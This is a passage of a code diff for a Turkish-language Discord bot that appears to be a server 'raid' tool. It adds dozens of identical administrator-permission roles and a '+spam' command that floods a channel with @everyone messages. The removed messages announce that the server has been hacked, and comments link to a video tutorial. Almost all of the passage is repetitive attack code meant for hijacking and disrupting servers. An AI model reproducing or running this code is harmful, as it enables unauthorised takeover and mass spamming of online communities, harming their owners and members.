+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+
+
+      
   }
 });
 
 client.on('message', msg => {
   if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
